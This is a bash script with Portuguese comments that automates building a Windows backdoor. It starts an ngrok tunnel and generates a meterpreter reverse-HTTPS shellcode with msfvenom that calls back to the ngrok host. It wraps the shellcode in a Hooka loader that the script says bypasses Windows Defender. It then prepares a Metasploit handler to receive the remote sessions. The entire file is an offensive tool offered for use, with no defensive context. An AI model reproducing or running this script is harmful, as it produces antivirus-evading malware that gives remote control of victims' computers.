#!/bin/bash

# Ferramentas utilizadas e dependências... Ngrok, msfconsole, msvenom e hooka

# Variáveis
lport_ngrok=""
lhost_ngrok="0.tcp.sa.ngrok.io"
ip="set lhost 0.0.0.0"
lport="set lport 8443"
payload="set payload windows/x64/meterpreter_reverse_https"
run="exploit -j -z"
session="set ExitOnSession false"
new_terminal="cmd.exe /c start wt new-tab wsl.exe"
carga="use exploit/multi/handler"
hooka="./hooka_linux_amd64 -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep 60 --acg"

echo " 
[**Abrindo ngrok em nova aba e iniciando tunelamento**] 
"

$new_terminal ngrok tcp 8443
echo " 
[**Ngrok iniciado com sucesso!**] 
"

read -p " [**Qual foi a porta dropada pelo ngrok?**] ex: (tcp://0.tcp.sa.ngrok.io:sua_porta)... " lport_ngrok
echo " 
[**PORTA CONFIGURADA COM SUCESSO**] 
"

echo " [**Iniciando a criação da payload com Msfvenom para Windows!!**] 
"
mkdir -p "carga"
msfvenom --platform windows -p windows/x64/meterpreter_reverse_https lhost="$lhost_ngrok" -a x64 -f raw lport="$lport_ngrok" -o "carga/shellcode.bin"
echo " 
[**Backdoor criada com sucesso**] 
"

echo " 
[**FAZENDO BYPASS NO WINDOWS DEFENDER COM HOOKA**] 
"
cp -r carga/shellcode.bin /root/Hooka/build/
cd /root/Hooka/build/
$hooka
cd /root/am3b4_3xpl01ting/carga/
cp -r /root/Hooka/build/loader.exe /root/am3b4_3xpl01ting/carga/
cd ../
echo " 
[**Bypass feita no Windows Defender com sucesso!!**] 
"

echo " 
[**Iniciando Msfconsole e iniciando escuta com a Backdoor**] 
"
echo -e "$carga\n$payload\n$lport\n$ip\n$session\n$run" > msf_script.rc
$new_terminal msfconsole -q
echo " 
[**Executar este comando manualmente**]: resource /root/am3b4_3xpl01ting/msf_script.rc 
"


